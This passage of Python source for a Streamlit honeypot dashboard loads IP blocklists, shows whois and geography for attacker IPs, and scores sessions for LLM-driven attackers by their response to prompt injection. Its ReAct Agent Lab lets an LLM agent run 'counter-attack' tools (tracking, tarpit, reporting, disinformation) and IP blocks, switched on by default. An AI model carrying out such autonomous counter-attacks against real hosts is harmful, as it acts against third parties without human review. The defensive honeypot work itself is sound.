            series = pd.cut(timing_vals, bins=bins, labels=labels, include_lowest=True)
            st.bar_chart(series.value_counts().sort_index())
        else:
            st.info("No timing data on alerts yet (enable Phase 1.5 enrichment).")

    if session_scores:
        rows = []
        for s in sorted(session_scores, key=lambda x: str(x.get("classified_at", "")), reverse=True):
            ic = s.get("injection_compliance") or {}
            rows.append({
                "Session": s.get("session_id", "N/A"),
                "Source IP": s.get("src_ip", "N/A"),
                "Actor class": actor_class_display(str(s.get("actor_class", "unknown"))),
                "Median Δ (s)": s.get("median_delta_sec"),
                "Commands": s.get("command_count"),
                "Goal hijack": ic.get("goal_hijack"),
                "Prompt steal": ic.get("prompt_steal"),
                "Final": s.get("final", False),
                "Classified at": s.get("classified_at", "N/A"),
            })
        with st.expander(f"📋 Session actor scores ({len(rows)})", expanded=False):
            st.dataframe(pd.DataFrame(rows), use_container_width=True, hide_index=True)
    else:
        st.info(
            f"No scores from Kafka topic `{_KAFKA_SESSION_ACTOR_TOPIC}`. "
            "Run `ratatoskr utils simulate-attacks --e2e --scenario fast_llm_agent_session` "
            "or enable **Both** as the data source."
        )

    llm_alerts = [
        a for a in (alerts_data or [])
        if alert_actor_class(a) in ("potential_llm", "confirmed_llm")
    ]
    if llm_alerts:
        with st.expander(
            f"🚨 LLM-flagged alerts ({min(len(llm_alerts), 20)} of {len(llm_alerts)})",
            expanded=False,
        ):
            for alert in llm_alerts[:20]:
                ac = alert_actor_class(alert)
                with st.expander(
                    f"{actor_class_display(ac)} — {alert.get('threat_type', 'UNKNOWN')} "
                    f"from {alert.get('source_ip', 'N/A')}",
                    expanded=False,
                ):
                    _render_actor_classification_panel(alert)
                    st.markdown(f"**Description:** {alert.get('description', 'N/A')}")
                    if alert.get("attack_details"):
                        st.json(alert.get("attack_details"))


def _try_run_demo_cowrie_response() -> Dict[str, Any]:
    """
    Best-effort helper to generate demo data for the dashboard.

    Tries local execution first, then falls back to running inside the TaskManager container
    used by the repo's docker-compose setup.
    """
    def _resolve_demo_abs_path() -> Optional[str]:
        candidates = [
            os.path.join(_REPO_ROOT, "demo_cowrie_response.py"),
            os.path.join(os.getcwd(), "demo_cowrie_response.py"),
            os.path.abspath("demo_cowrie_response.py"),
            # Common container locations
            "/opt/flink/demo_cowrie_response.py",
            "/opt/demo_cowrie_response.py",
        ]
        for p in candidates:
            try:
                if p and os.path.exists(p):
                    return os.path.abspath(p)
            except Exception:
                continue
        return None

    demo_abs = _resolve_demo_abs_path()
    repo_root = _REPO_ROOT
    local_cmd = [sys.executable or "python3", demo_abs or "demo_cowrie_response.py"]
    try:
        p = subprocess.run(
            local_cmd,
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=90,
        )
        return {
            "attempt": "local",
            "cmd": " ".join(local_cmd),
            "demo_path": demo_abs,
            "returncode": p.returncode,
            "stdout": (p.stdout or "").strip(),
            "stderr": (p.stderr or "").strip(),
        }
    except Exception as e:
        local_err = str(e)

    # Docker fallback (common when dashboard runs outside the Flink image)
    # Use an absolute path inside the container to avoid cwd/path confusion.
    demo_in_container = "/opt/flink/demo_cowrie_response.py"
    docker_cmd = [
        "docker",
        "exec",
        "flinkdockerwithagents-taskmanager-1",
        "bash",
        "-lc",
        f"python3 {demo_in_container}",
    ]
    try:
        p = subprocess.run(
            docker_cmd,
            capture_output=True,
            text=True,
            timeout=120,
        )
        return {
            "attempt": "docker",
            "cmd": " ".join(docker_cmd),
            "demo_path": demo_in_container,
            "returncode": p.returncode,
            "stdout": (p.stdout or "").strip(),
            "stderr": (p.stderr or "").strip(),
            "local_error": local_err,
        }
    except Exception as e:
        return {
            "attempt": "docker",
            "cmd": " ".join(docker_cmd),
            "demo_path": demo_in_container,
            "returncode": None,
            "stdout": "",
            "stderr": str(e),
            "local_error": local_err,
        }


def extract_blocked_ips_from_dashboard_data(alerts_data):
    """Extract blocked IPs from response actions in dashboard data."""
    blocked_ips_map = {}
    
    for alert in alerts_data:
        for action in alert.get("response_actions", []):
            action_type = action.get("action_type", "")
            
            # Check for blocking actions
            if action_type in ["BLOCK_IP_COWRIE", "BLOCK_IP"]:
                target = action.get("target", "")
                status = action.get("status", "")
                
                # Only include successfully blocked IPs
                if status in ["blocked", "success"] and target:
                    # Use the most recent entry if IP appears multiple times
                    if target not in blocked_ips_map:
                        blocked_ips_map[target] = {
                            "ip": target,
                            "reason": action.get("reason", "Blocked by Flink Agents"),
                            "blocked_at": action.get("timestamp", datetime.now().isoformat()),
                            "duration_hours": 24,
                            "blocked_by": "Flink Agents",
                            "action_type": action_type,
                            "severity": action.get("severity", "UNKNOWN")
                        }
                    else:
                        # Update if this is a more recent block
                        existing_time = blocked_ips_map[target].get("blocked_at", "")
                        new_time = action.get("timestamp", "")
                        if new_time > existing_time:
                            blocked_ips_map[target].update({
                                "reason": action.get("reason", blocked_ips_map[target].get("reason", "")),
                                "blocked_at": new_time,
                                "action_type": action_type,
                                "severity": action.get("severity", blocked_ips_map[target].get("severity", "UNKNOWN"))
                            })
    
    return list(blocked_ips_map.values())


# Load blocked IPs
@st.cache_data(ttl=2)  # Cache for 2 seconds to allow frequent updates
def load_blocked_ips():
    """Load blocked IPs from blocklist JSON file, or extract from dashboard data."""
    # Get current working directory and script directory
    cwd = os.getcwd()
    
    # Try to get script directory (works in normal Python, may not work in Streamlit)
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
    except:
        script_dir = cwd
    
    # Try multiple possible locations (local and Docker)
    possible_paths = [
        # Relative to current working directory
        "cowrie-data/blocklist.json",
        "./cowrie-data/blocklist.json",
        # Absolute paths from CWD
        os.path.abspath("cowrie-data/blocklist.json"),
        os.path.abspath("./cowrie-data/blocklist.json"),
        # Relative to script location
        os.path.join(script_dir, "cowrie-data", "blocklist.json"),
        os.path.join(cwd, "cowrie-data", "blocklist.json"),
        # Absolute paths
        "/cowrie/cowrie/data/blocklist.json",
        "/opt/flink/cowrie-data/blocklist.json",
        # Docker container paths (if running in container)
        "/opt/flink/cowrie/cowrie/data/blocklist.json",
    ]
    
    blocklist_file = None
    for path in possible_paths:
        try:
            abs_path = os.path.abspath(path) if not os.path.isabs(path) else path
            if os.path.exists(abs_path):
                blocklist_file = abs_path
                break
        except:
            continue
    
    # Also try reading from Docker container if running locally
    if not blocklist_file:
        blocked_ips = try_load_from_docker_container()
        if blocked_ips:
            return blocked_ips
    
    # Try to load from blocklist file
    blocked_ips = []
    if blocklist_file:
        try:
            with open(blocklist_file, 'r') as f:
                data = json.load(f)
                blocked_ips = data.get("blocked_ips", [])
        except json.JSONDecodeError:
            pass
        except Exception:
            pass
    
    # If blocklist file is empty or doesn't exist, extract from dashboard data
    if not blocked_ips:
        # Try reading from text file as fallback first
        blocked_ips = load_blocked_ips_from_text()
        
        # If still no IPs, extract from dashboard data
        if not blocked_ips:
            alerts_data = load_dashboard_data()
            if alerts_data:
                blocked_ips = extract_blocked_ips_from_dashboard_data(alerts_data)
    
    return blocked_ips


def try_load_from_docker_container():
    """Try to load blocklist from Docker container."""
    try:
        import subprocess
        # Try to read from TaskManager container
        result = subprocess.run(
            ["docker", "exec", "flinkdockerwithagents-taskmanager-1", "cat", "/cowrie/cowrie/data/blocklist.json"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            return data.get("blocked_ips", [])
    except Exception:
        pass
    return []


def is_private_ip(ip: str) -> bool:
    """True for RFC1918 / loopback / link-local / TEST-NET (non-global) addresses."""
    try:
        ip_obj = ipaddress.ip_address(ip)
        return (
            ip_obj.is_private
            or ip_obj.is_loopback
            or ip_obj.is_link_local
            or ip_obj.is_reserved
            or not ip_obj.is_global
        )
    except ValueError:
        return False


def alert_source_ip(alert: dict) -> str:
    """Prefer source_ip, fall back to src_ip (Kafka / lab shapes differ)."""
    if not isinstance(alert, dict):
        return ""
    return str(alert.get("source_ip") or alert.get("src_ip") or "").strip()


# Deterministic demo origins for lab / TEST-NET IPs (whois unavailable)
_DEMO_GEO_ORIGINS = (
    {"country": "United States", "lat": 37.77, "lon": -122.42, "city": "San Francisco"},
    {"country": "Russia", "lat": 55.75, "lon": 37.62, "city": "Moscow"},
    {"country": "China", "lat": 31.23, "lon": 121.47, "city": "Shanghai"},
    {"country": "Netherlands", "lat": 52.37, "lon": 4.90, "city": "Amsterdam"},
    {"country": "Brazil", "lat": -23.55, "lon": -46.63, "city": "São Paulo"},
    {"country": "India", "lat": 19.08, "lon": 72.88, "city": "Mumbai"},
    {"country": "Germany", "lat": 52.52, "lon": 13.40, "city": "Berlin"},
    {"country": "Singapore", "lat": 1.35, "lon": 103.82, "city": "Singapore"},
)

_COUNTRY_COORDS = {
    "US": (39.8, -98.5),
    "USA": (39.8, -98.5),
    "UNITED STATES": (39.8, -98.5),
    "RU": (61.5, 105.3),
    "RUS": (61.5, 105.3),
    "RUSSIA": (61.5, 105.3),
    "CN": (35.9, 104.2),
    "CHN": (35.9, 104.2),
    "CHINA": (35.9, 104.2),
    "NL": (52.1, 5.3),
    "NLD": (52.1, 5.3),
    "NETHERLANDS": (52.1, 5.3),
    "BR": (-14.2, -51.9),
    "BRA": (-14.2, -51.9),
    "BRAZIL": (-14.2, -51.9),
    "IN": (20.6, 78.9),
    "IND": (20.6, 78.9),
    "INDIA": (20.6, 78.9),
    "DE": (51.2, 10.4),
    "DEU": (51.2, 10.4),
    "GERMANY": (51.2, 10.4),
    "SG": (1.35, 103.8),
    "SGP": (1.35, 103.8),
    "SINGAPORE": (1.35, 103.8),
    "GB": (55.4, -3.4),
    "UK": (55.4, -3.4),
    "UNITED KINGDOM": (55.4, -3.4),
}


def demo_geo_for_ip(ip: str) -> Dict[str, Any]:
    """Stable fake geo for honeypot / documentation IPs so maps still render."""
    try:
        last = int(str(ip).rsplit(".", 1)[-1])
    except Exception:
        last = sum(ord(c) for c in str(ip))
    origin = dict(_DEMO_GEO_ORIGINS[last % len(_DEMO_GEO_ORIGINS)])
    origin.update(
        {
            "type": "demo",
            "asn": "AS64500",
            "asn_description": "Honeypot lab / TEST-NET",
            "organization": "Demo attacker (synthetic)",
            "note": "Lab IP — assigned demo geography (whois not available)",
        }
    )
    return origin


def country_coords(country: str) -> tuple:
    key = (country or "").strip().upper()
    return _COUNTRY_COORDS.get(key, (20.0, 0.0))


@st.cache_data(ttl=3600)  # Cache whois lookups for 1 hour
def lookup_whois_cached(ip: str) -> Optional[Dict[str, Any]]:
    """Perform whois lookup on an IP address (cached)."""
    # Lab / private / TEST-NET — deterministic demo geography (Python 3.12 marks TEST-NET private)
    if is_private_ip(ip):
        return demo_geo_for_ip(ip)

    if not WHOIS_AVAILABLE:
        return demo_geo_for_ip(ip)

    try:
        obj = IPWhois(ip)
        result = obj.lookup_rdap(depth=1)

        whois_info = {
            "asn": result.get("asn", "N/A"),
            "asn_description": result.get("asn_description", "N/A"),
            "network": result.get("network", {}).get("name", "N/A") if result.get("network") else "N/A",
            "country": result.get("asn_country_code", "N/A"),
            "type": "whois",
        }

        entities = result.get("entities", [])
        if entities:
            org_info = []
            for entity in entities[:3]:
                if isinstance(entity, dict):
                    org_name = entity.get("vcardArray", [{}])[1] if entity.get("vcardArray") else None
                    if org_name and isinstance(org_name, list):
                        for item in org_name:
                            if isinstance(item, list) and len(item) > 3 and item[0] == "fn":
                                org_info.append(item[3])
            if org_info:
                whois_info["organization"] = ", ".join(org_info[:2])

        if result.get("network"):
            network_info = result["network"]
            if network_info.get("start_address") and network_info.get("end_address"):
                whois_info["ip_range"] = (
                    f"{network_info['start_address']} - {network_info['end_address']}"
                )
            if network_info.get("cidr"):
                whois_info["cidr"] = network_info.get("cidr")

        country = whois_info.get("country") or "N/A"
        if country in (None, "", "N/A"):
            return demo_geo_for_ip(ip)
        lat, lon = country_coords(str(country))
        whois_info["lat"] = lat
        whois_info["lon"] = lon
        return whois_info

    except Exception as e:
        fallback = demo_geo_for_ip(ip)
        fallback["error"] = str(e)[:120]
        fallback["note"] = "Whois lookup failed — using demo geography"
        return fallback


def load_blocked_ips_from_text():
    """Load blocked IPs from blocklist.txt file as fallback."""
    # Get current working directory and script directory
    cwd = os.getcwd()
    
    # Try to get script directory (works in normal Python, may not work in Streamlit)
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
    except:
        script_dir = cwd
    
    possible_paths = [
        # Relative to current working directory
        "cowrie-data/blocklist.txt",
        "./cowrie-data/blocklist.txt",
        # Absolute paths from CWD
        os.path.abspath("cowrie-data/blocklist.txt"),
        os.path.abspath("./cowrie-data/blocklist.txt"),
        # Relative to script location
        os.path.join(script_dir, "cowrie-data", "blocklist.txt"),
        os.path.join(cwd, "cowrie-data", "blocklist.txt"),
        # Absolute paths
        "/cowrie/cowrie/data/blocklist.txt",
        "/opt/flink/cowrie-data/blocklist.txt",
        # Docker container paths
        "/opt/flink/cowrie/cowrie/data/blocklist.txt",
    ]
    
    blocklist_file = None
    for path in possible_paths:
        try:
            abs_path = os.path.abspath(path) if not os.path.isabs(path) else path
            if os.path.exists(abs_path):
                blocklist_file = abs_path
                break
        except:
            continue
    
    # Also try reading from Docker container if running locally
    if not blocklist_file:
        blocked_ips = try_load_text_from_docker_container()
        if blocked_ips:
            return blocked_ips
    
    if not blocklist_file:
        return []
    
    blocked_ips = []
    try:
        with open(blocklist_file, 'r') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if line and not line.startswith('#'):
                    # Parse line: IP # Comment
                    parts = line.split('#', 1)
                    ip = parts[0].strip()
                    
                    # Extract timestamp from comment if present
                    comment = parts[1].strip() if len(parts) > 1 else "Blocked by Flink Agents"
                    
                    # Try to extract timestamp from comment
                    blocked_at = None
                    if "at" in comment.lower():
                        # Look for ISO timestamp pattern
                        import re
                        timestamp_match = re.search(r'(\d{4}-\d{2}-\d{2}T[\d:\.]+)', comment)
                        if timestamp_match:
                            blocked_at = timestamp_match.group(1)
                    
                    if not blocked_at:
                        blocked_at = datetime.now().isoformat()
                    
                    blocked_ips.append({
                        "ip": ip,
                        "reason": comment,
                        "blocked_at": blocked_at,
                        "duration_hours": 24,
                        "blocked_by": "Flink Agents"
                    })
    except Exception as e:
        # Don't show error in cached function, will be handled in main
        pass
    
    return blocked_ips


def try_load_text_from_docker_container():
    """Try to load blocklist text from Docker container."""
    try:
        import subprocess
        # Try to read from TaskManager container
        result = subprocess.run(
            ["docker", "exec", "flinkdockerwithagents-taskmanager-1", "cat", "/cowrie/cowrie/data/blocklist.txt"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0 and result.stdout:
            blocked_ips = []
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split('#', 1)
                    ip = parts[0].strip()
                    comment = parts[1].strip() if len(parts) > 1 else "Blocked by Flink Agents"
                    
                    # Extract timestamp
                    import re
                    blocked_at = None
                    timestamp_match = re.search(r'(\d{4}-\d{2}-\d{2}T[\d:\.]+)', comment)
                    if timestamp_match:
                        blocked_at = timestamp_match.group(1)
                    else:
                        blocked_at = datetime.now().isoformat()
                    
                    blocked_ips.append({
                        "ip": ip,
                        "reason": comment,
                        "blocked_at": blocked_at,
                        "duration_hours": 24,
                        "blocked_by": "Flink Agents"
                    })
            return blocked_ips
    except Exception:
        pass
    return []


def get_severity_color(severity):
    """Get color for severity level (Studio palette)."""
    return SEVERITY_COLOR_MAP.get(severity, "#5c5278")


def get_severity_emoji(severity):
    """Get emoji for severity level."""
    emojis = {
        "CRITICAL": "🔴",
        "HIGH": "🟠",
        "MEDIUM": "🟡",
        "LOW": "🟢"
    }
    return emojis.get(severity, "⚪")


def react_agent_star(alert) -> str:
    """Gold star prefix when ReAct was used for this alert."""
    return "⭐ " if is_react_agent_alert(alert) else ""


def react_agent_badge_markdown() -> str:
    """Inline markdown badge for ReAct alerts."""
    return '<span class="react-agent-star" title="Cloudera ReAct agent">⭐ ReAct</span>'


def _counter_attack_status_emoji(status: str) -> str:
    ok = {
        "success",
        "gathered",
        "deployed",
        "tracking",
        "shared",
        "reported",
        "fed",
        "sent",
        "blocked",
        "already_blocked",
    }
    if str(status).lower() in ok:
        return "✅"
    if str(status).lower() == "recommended":
        return "💡"
    return "⏳"


def _result_field(result: dict, *keys, default="—"):
    for k in keys:
        v = result.get(k)
        if v is not None and v != "":
            return v
    return default


def _render_counter_attacks_block(result: dict) -> None:
    """Compact response summary for a lab test (no metric soup)."""
    counter_attacks = result.get("counter_attacks") or []
    executed_response = result.get("executed_response_actions") or []
    recommended = result.get("recommended_actions") or []
    severity = _result_field(result, "severity", default="—")
    ca_n = result.get("counter_attack_count", len(counter_attacks))
    resp_n = result.get("executed_response_count", len(executed_response))
    rec_n = result.get("recommended_action_count", len(recommended))

    st.caption(
        f"Severity **{severity}** · {ca_n} counter-attack · "
        f"{resp_n} block/alert · {rec_n} recommended"
    )

    if executed_response:
        with st.expander(f"Blocks/alerts ({len(executed_response)})", expanded=False):
            st.dataframe(
                [
                    {
                        "Action": r.get("label") or r.get("action_type"),
                        "Status": r.get("status"),
                        "Target": r.get("target"),
                    }
                    for r in executed_response
                ],
                use_container_width=True,
                hide_index=True,
            )

    if counter_attacks:
        with st.expander(f"Counter-attacks ({len(counter_attacks)})", expanded=False):
            st.dataframe(
                [
                    {
                        "Action": ca.get("label") or ca.get("action_type"),
                        "Status": ca.get("status"),
                        "Target": ca.get("target"),
                    }
                    for ca in counter_attacks
                ],
                use_container_width=True,
                hide_index=True,
            )

    if recommended:
        with st.expander(f"Recommended ({len(recommended)})", expanded=False):
            st.dataframe(
                [
                    {
                        "Action": r.get("action_type"),
                        "Status": r.get("status"),
                        "Target": r.get("target"),
                    }
                    for r in recommended
                ],
                use_container_width=True,
                hide_index=True,
            )


def _render_test_result_card(result: dict, *, title: str) -> None:
    """Single readable summary for a pipeline lab result."""
    is_react = bool(result.get("is_react"))
    ok = bool(result.get("passed", result.get("ok")))
    if is_react:
        status = "ReAct"
    elif ok:
        status = "Workflow"
    else:
        status = "Failed"

    req = _result_field(result, "requested_engine", "engine", default="n/a")
    act = _result_field(result, "actual_engine", "engine", default="n/a")
    if not result.get("actual_engine") and is_react:
        act = "react"
    elif not result.get("actual_engine") and ok and not is_react:
        act = "workflow"
    if not ok and not is_react:
        act = _result_field(result, "actual_engine", default="none")

    alert = result.get("alert") if isinstance(result.get("alert"), dict) else {}
    src = _result_field(result, "detection_source", default=alert.get("detection_source") or "—")
    aid = _result_field(result, "alert_id", default=alert.get("alert_id") or "—")
    ip = _result_field(result, "src_ip", default=alert.get("src_ip") or "—")
    threat = _result_field(result, "threat_type", default=alert.get("threat_type") or "—")
    elapsed = _result_field(result, "elapsed_ms", default="—")
    actions = result.get(
        "response_action_count",
        len(result.get("counter_attacks") or [])
        + len(result.get("executed_response_actions") or []),
    )

    st.markdown(f"**{title}** — {status}")
    st.markdown(
        f"| | |\n|---|---|\n"
        f"| Engine | `{req}` → `{act}` |\n"
        f"| Time | {elapsed} ms |\n"
        f"| Actions | {actions} |\n"
        f"| IP | `{ip}` |\n"
        f"| Threat | `{threat}` |\n"
        f"| Source | `{src}` |\n"
        f"| Alert | `{aid}` |"
    )
    if result.get("error"):
        st.error(_humanize_react_error(result["error"])[:240])
    reasoning = result.get("reasoning")
    if not reasoning and isinstance(alert, dict):
        ad = alert.get("attack_details") if isinstance(alert.get("attack_details"), dict) else {}
        reasoning = ad.get("react_reasoning") or alert.get("reasoning")
    if reasoning:
        if _react_reasoning_is_guardrail_only(reasoning):
            st.warning(_format_react_reasoning_caption(reasoning))
        else:
            with st.expander("Reasoning", expanded=False):
                st.write(str(reasoning)[:500])
    _render_counter_attacks_block(result)
    if is_react:
        st.markdown(react_agent_badge_markdown(), unsafe_allow_html=True)


def _render_compare_section(cmp: dict, *, ca_on: bool) -> None:
    """Readable workflow vs ReAct comparison (table first, details below)."""
    st.subheader("Compare: Workflow vs ReAct")
    st.caption(f"Shared IP `{cmp.get('src_ip')}`")

    wf = cmp.get("workflow") or {}
    rx = cmp.get("react") or {}

    def _row(label: str, left, right) -> dict:
        return {"": label, "Workflow": left, "ReAct": right}

    wf_status = "ReAct" if wf.get("is_react") else ("OK" if wf.get("ok") else "Failed")
    rx_status = "ReAct" if rx.get("is_react") else ("OK" if rx.get("ok") else "Failed")
    st.dataframe(
        [
            _row("Status", wf_status, rx_status),
            _row(
                "Engine",
                f"{_result_field(wf, 'requested_engine', 'engine')} → {_result_field(wf, 'actual_engine', 'engine')}",
                f"{_result_field(rx, 'requested_engine', 'engine')} → {_result_field(rx, 'actual_engine', 'engine', default='none')}",
            ),
            _row("ms", _result_field(wf, "elapsed_ms"), _result_field(rx, "elapsed_ms")),
            _row(
                "Threat",
                _result_field(wf, "threat_type", default=(wf.get("alert") or {}).get("threat_type")),
                _result_field(rx, "threat_type", default=(rx.get("alert") or {}).get("threat_type")),
            ),
            _row(
                "Counter-attacks",
                wf.get("counter_attack_count", 0),
                rx.get("counter_attack_count", 0),
            ),
            _row(
                "Error",
                (str(wf.get("error") or "—")[:80]),
                (str(rx.get("error") or "—")[:80]),
            ),
        ],
        use_container_width=True,
        hide_index=True,
    )

    if cmp.get("compare_ok"):
        st.success("ReAct path confirmed")
    else:
        err = _humanize_react_error(rx.get("error") or "No ReAct markers")
        st.warning(f"ReAct did not win this run: {err}")

    with st.expander("Workflow details", expanded=False):
        _render_test_result_card(wf, title="Workflow")
    with st.expander("ReAct details", expanded=False):
        _render_test_result_card(rx, title="ReAct")

    if (
        rx.get("counter_attack_count", 0) == 0
        and rx.get("is_react")
        and ca_on
    ):
        st.caption("ReAct ran but recorded no counter-attacks — check severity / execute flags.")


def _react_lab_modules():
    """
    Return react test helpers, reloading from disk so compose volume mounts apply
    without restarting the long-lived Streamlit process.
    """
    import importlib

    import react_agent_ui_test

    try:
        import cowrie_log_processor

        importlib.reload(cowrie_log_processor)
    except Exception:
        pass

    try:
        import react_dashboard_bridge

        importlib.reload(react_dashboard_bridge)
    except Exception:
        pass

    try:
        import demo_cloudera_react_agent

        importlib.reload(demo_cloudera_react_agent)
    except Exception:
        pass

    for mod_name in ("react_counter_attack_executor", "react_response_executor", "cowrie_security_alert"):
        try:
            mod = importlib.import_module(mod_name)
            importlib.reload(mod)
        except Exception:
            pass

    importlib.reload(react_agent_ui_test)
    return react_agent_ui_test


def render_react_agent_lab() -> None:
    """Dedicated page to verify Cloudera ReAct vs workflow with explicit pass/fail."""
    st.markdown(
        '<div class="main-header">ReAct Agent Lab</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Cloudera LLM · tool-using agent experiments</p>',
        unsafe_allow_html=True,
    )
    st.markdown(
        "Run controlled tests here to confirm whether **Cloudera ReAct** or **workflow** "
        "handled each event. ReAct successes show an **orange star**. "
        "On CRITICAL/HIGH events, ReAct also **executes defensive counter-attack tools** "
        "(mock OSINT, tarpit, reporting, etc.) when "
        "`COWRIE_REACT_EXECUTE_COUNTER_ATTACKS=1`."
    )

    if not REACT_UI_TEST_AVAILABLE:
        st.error("`react_agent_ui_test.py` not found on PYTHONPATH. Mount it in the dashboard container.")
        return

    rtl = _react_lab_modules()
    diag = rtl.get_react_diagnostics()

    st.subheader("🔧 Environment")
    ca_env = (os.getenv("COWRIE_REACT_EXECUTE_COUNTER_ATTACKS") or "1").strip().lower()
    ca_on = ca_env not in ("0", "false", "no", "off")
    resp_env = (os.getenv("COWRIE_REACT_EXECUTE_RESPONSE_ACTIONS") or "1").strip().lower()
    resp_on = resp_env not in ("0", "false", "no", "off")
    block_env = (os.getenv("COWRIE_REACT_EXECUTE_BLOCK_IP") or "1").strip().lower()
    block_on = resp_on and block_env not in ("0", "false", "no", "off")
    data_dir = (os.getenv("COWRIE_DATA_DIR") or "/cowrie/cowrie/data").strip()
    d1, d2, d3, d4, d5, d6, d7 = st.columns(7)
    d1.metric("Configured engine", diag["configured_engine"])
    d2.metric("Effective engine", diag["effective_engine"])
    d3.metric("ReAct ready", "✅" if diag["react_ready"] else "❌")
    d4.metric("Flink Agents", "✅" if diag["flink_agents_ok"] else "❌")
    d5.metric("Counter-attacks", "✅ On" if ca_on else "❌ Off")
    d6.metric("Alert execution", "✅ On" if resp_on else "❌ Off")
    d7.metric("Block IP (Cowrie)", "✅ On" if block_on else "❌ Off")

    jwt_status = _cloudera_jwt_status()
    if not jwt_status.get("ok"):
        st.error(jwt_status["message"])
    else:
        st.caption(jwt_status["message"])
        # Drop stale lab failures from before the token was refreshed.
        for key in ("react_lab_last", "react_lab_compare", "react_lab_kafka"):
            prev = st.session_state.get(key)
            if not prev:
                continue
            err = ""
            if isinstance(prev, dict):
                err = str(prev.get("error") or "")
                if not err and isinstance(prev.get("react"), dict):
                    err = str((prev.get("react") or {}).get("error") or "")
            if err and (
                "expired" in err.lower()
                or "expecting value" in err.lower()
                or "line 1 column 1" in err.lower()
            ):
                del st.session_state[key]

    st.caption(
        "Severity policy: **MEDIUM** → gather intel · **HIGH** → + track, tarpit, share, **Cowrie block** · "
        "**CRITICAL** → + report, disinformation · Set `COWRIE_REACT_EXECUTE_COUNTER_ATTACKS=0` to disable counter-attacks. "
        "Alerts via `cowrie_security_alert` when `COWRIE_REACT_EXECUTE_RESPONSE_ACTIONS=1`. "
        f"HIGH/CRITICAL blocks write to `{data_dir}` when `COWRIE_REACT_EXECUTE_BLOCK_IP=1`."
    )

    with st.expander("Dependency checks", expanded=not diag["react_ready"]):
        checks = {
            "Cloudera creds": diag["cloudera_config_ok"],
            "OpenAI library": diag["openai_ok"],
            "demo_cloudera_react": diag["demo_cloudera_ok"],
            "Flink Agents import": diag["flink_agents_ok"],
        }
        for label, ok in checks.items():
            st.write(f"{'✅' if ok else '❌'} {label}")
        if diag.get("hints"):
            st.markdown("**Fix hints**")
            for hint in diag["hints"]:
                st.markdown(f"- {hint}")

    st.markdown("---")
    st.subheader("🧪 In-process tests (same code as Simulate Attacks)")

    attack_type = st.selectbox("Attack scenario", options=list(rtl.ATTACK_TYPES), index=0)
    append = st.checkbox("Append results to dashboard JSON", value=True)

    jwt_ok = bool(jwt_status.get("ok"))
    if not jwt_ok:
        st.info(
            "ReAct / Compare need a valid Cloudera JWT. "
            "Open **Settings**, paste a fresh token, click **Apply**, then return here."
        )

    col_w, col_r, col_a = st.columns(3)
    with col_w:
        run_wf = st.button("▶️ Test Workflow", use_container_width=True)
    with col_r:
        run_react = st.button(
            "⭐ Test ReAct",
            use_container_width=True,
            disabled=not jwt_ok,
            help=None if jwt_ok else jwt_status.get("message"),
        )
    with col_a:
        run_auto = st.button(
            "🔀 Test Auto",
            use_container_width=True,
            disabled=not jwt_ok,
            help=None if jwt_ok else jwt_status.get("message"),
        )

    run_compare = st.button(
        "⚖️ Compare Workflow vs ReAct (same IP)",
        use_container_width=True,
        disabled=not jwt_ok,
        help=None if jwt_ok else jwt_status.get("message"),
    )
    if run_compare:
        with st.spinner("Running workflow + ReAct on the same synthetic IP..."):
            cmp = rtl.run_compare_test(attack_type=attack_type, append_to_dashboard=append)
        # Humanize nested errors for display
        for side in ("workflow", "react"):
            side_res = cmp.get(side) or {}
            if side_res.get("error"):
                side_res["error"] = _humanize_react_error(side_res["error"])
        st.session_state["react_lab_compare"] = cmp
        if append:
            load_dashboard_data.clear()

    if run_wf:
        with st.spinner("Running workflow test..."):
            st.session_state["react_lab_last"] = rtl.run_pipeline_test(
                engine="workflow", attack_type=attack_type, append_to_dashboard=append
            )
        if append:
            load_dashboard_data.clear()
    if run_react:
        with st.spinner("Calling Cloudera ReAct (may take 10–60s)..."):
            res = rtl.run_pipeline_test(
                engine="react", attack_type=attack_type, append_to_dashboard=append
            )
            if res.get("error"):
                res["error"] = _humanize_react_error(res["error"])
            st.session_state["react_lab_last"] = res
        if append:
            load_dashboard_data.clear()
    if run_auto:
        with st.spinner("Running auto engine test..."):
            res = rtl.run_pipeline_test(
                engine="auto", attack_type=attack_type, append_to_dashboard=append
            )
            if res.get("error"):
                res["error"] = _humanize_react_error(res["error"])
            st.session_state["react_lab_last"] = res
        if append:
            load_dashboard_data.clear()

    last = st.session_state.get("react_lab_last")
    if last:
        st.markdown("---")
        _render_test_result_card(last, title="Last test")
        with st.expander("Raw alert JSON"):
            st.json(last.get("alert") or {})

    cmp = st.session_state.get("react_lab_compare")
    if cmp:
        st.markdown("---")
        _render_compare_section(cmp, ca_on=ca_on)

    with st.expander("🟣 Kafka Phase 3 sidecar", expanded=False):
        st.caption(
            "Publishes to `cowrie.normalized` and waits for `cowrie.react_alerts` "
            "(requires `kafka-react-augmentor` running). "
            "This block is only on **ReAct Agent Lab**, not Settings."
        )
        if st.button("📡 Test Phase 3 Kafka pipeline", use_container_width=True):
            with st.spinner(
                "Publishing to Kafka and waiting for cowrie.react_alerts (up to 90s)..."
            ):
                k = rtl.run_kafka_phase3_test(attack_type=attack_type, timeout_sec=90)
            st.session_state["react_lab_kafka"] = k

        k = st.session_state.get("react_lab_kafka")
        if k:
            if k.get("ok"):
                st.success(f"⭐ Phase 3 Kafka ReAct confirmed for `{k.get('src_ip')}`")
            else:
                st.error(f"Phase 3 Kafka test failed at stage `{k.get('stage')}`")
            with st.expander("Kafka test details"):
                st.json(k)

    st.caption(
        "CLI equivalent: `python3 scripts/test_react_agents.py --compare` "
        "or `docker exec ... python3 scripts/test_react_agents.py --engine react`"
    )


def _resolve_cowrie_dashboard_json_path() -> str:
    """Writable path for cowrie-dashboard-data.json (same search order as elsewhere in this app)."""
    candidates = [
        "/opt/flink/cowrie-dashboard-data.json",
        os.path.join(_REPO_ROOT, "cowrie-dashboard-data.json"),
        os.path.join(os.getcwd(), "cowrie-dashboard-data.json"),
        "./cowrie-dashboard-data.json",
    ]
    for path in candidates:
        ap = os.path.abspath(path) if not os.path.isabs(path) else path
